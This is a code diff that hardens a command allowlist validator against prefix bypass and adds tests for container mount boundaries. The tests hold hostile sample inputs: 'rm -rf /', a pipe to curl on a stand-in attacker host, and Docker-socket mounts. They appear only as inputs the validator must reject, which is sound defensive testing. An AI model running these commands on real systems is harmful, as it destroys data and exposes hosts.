@@ -93,7 +93,11 @@ def validate_command(command: list[str] | str) -> list[str]:
     if not command:
         raise ValueError("Command must be non-empty")
     cmd_str = " ".join(command)
-    if not any(cmd_str.startswith(prefix) for prefix in _ALLOWED_CMD_PREFIXES):
+    # Token-boundary match: exact match or prefix followed by a space.
+    # Prevents "pytester" or "unittest_backdoor" from matching "pytest"/"unittest".
+    if not any(
+        cmd_str == prefix or cmd_str.startswith(f"{prefix} ") for prefix in _ALLOWED_CMD_PREFIXES
+    ):
         raise ValueError(
             f"Command {cmd_str!r} does not start with an allowed prefix. "
             f"Allowed: {_ALLOWED_CMD_PREFIXES}"
@@ -437,10 +441,21 @@ class TestTier2FilesystemBoundary:
         or access the host filesystem.
         """
         config = ContainerConfig()
+        # Default is safe (no mounts)
         for mount in config.mounts:
             source = mount.get("source", "")
             assert "docker.sock" not in source, (
                 "Docker socket must never be mounted into a test container."
+            )
+
+        # Also verify the check catches docker.sock when mounts ARE present.
+        bad_config = ContainerConfig(
+            mounts=[{"source": "/var/run/docker.sock", "target": "/var/run/docker.sock"}]
+        )
+        for mount in bad_config.mounts:
+            source = mount.get("source", "")
+            assert "docker.sock" in source, (
+                "Sanity: docker.sock must be detectable in a non-empty mount list."
             )
 
     def test_mount_mode_enforced_read_only(self):
@@ -456,6 +471,15 @@ class TestTier2FilesystemBoundary:
         # they should default to read-only mode.
         for mount in config.mounts:
             assert mount.get("mode") == "ro", "All mounts must be read-only by default."
+
+        # Verify the check catches a non-read-only mount when mounts ARE present.
+        bad_config = ContainerConfig(
+            mounts=[{"source": "/workspace/data", "target": "/data", "mode": "rw"}]
+        )
+        for mount in bad_config.mounts:
+            assert mount.get("mode") != "ro", (
+                "Sanity: a 'rw' mount must be detectable as non-read-only."
+            )
 
     def test_blocked_attack_read_etc_shadow(self):
         """Filesystem boundary prevents reading /etc/shadow.
@@ -488,6 +512,15 @@ class TestTier2FilesystemBoundary:
         config = ContainerConfig()
         for mount in config.mounts:
             assert "docker.sock" not in mount.get("source", "")
+
+        # Verify detection works with non-empty mounts.
+        config_with_socket = ContainerConfig(
+            mounts=[{"source": "/var/run/docker.sock", "target": "/var/run/docker.sock"}]
+        )
+        for mount in config_with_socket.mounts:
+            assert "docker.sock" in mount.get("source", ""), (
+                "Sanity: docker.sock must be detectable when explicitly mounted."
+            )
 
     def test_blocked_attack_write_to_host_etc(self):
         """Filesystem boundary prevents writing to host /etc.
@@ -643,15 +676,37 @@ class TestTier2InputValidation:
         with pytest.raises(ValueError, match="does not start with"):
             validate_command(["bash", "-c", "rm -rf /"])
 
+    def test_command_validation_rejects_prefix_bypass(self):
+        """Commands like 'pytester' or 'unittest_backdoor' must not pass.
+
+        Regression: prefix matching on the joined string accepted
+        'pytester' because 'pytester'.startswith('pytest') is True.
+        """
+        import pytest
+
+        with pytest.raises(ValueError, match="does not start with"):
+            validate_command(["pytester", "-c", "evil"])
+
+        with pytest.raises(ValueError, match="does not start with"):
+            validate_command(["unittest_backdoor"])
+
+        with pytest.raises(ValueError, match="does not start with"):
+            validate_command(["python", "-m", "pytester"])
+
+        with pytest.raises(ValueError, match="does not start with"):
+            validate_command(["python", "-m", "unittest_evil"])
+
     def test_command_validation_rejects_shell_metacharacters(self):
         """Commands with shell metacharacters are rejected."""
         import pytest
 
-        with pytest.raises(ValueError, match="shell metacharacters"):
-            validate_command(["pytest; curl http://attacker.com"])
-
+        # Metacharacter in a later token (after valid prefix) is caught by the
+        # metacharacter check.
         with pytest.raises(ValueError, match="shell metacharacters"):
             validate_command(["pytest", "|", "curl", "http://attacker.com"])
+
+        with pytest.raises(ValueError, match="shell metacharacters"):
+            validate_command(["pytest", "$HOME/evil"])
 
     def test_command_validation_rejects_empty(self):
         """Empty commands are rejected."""
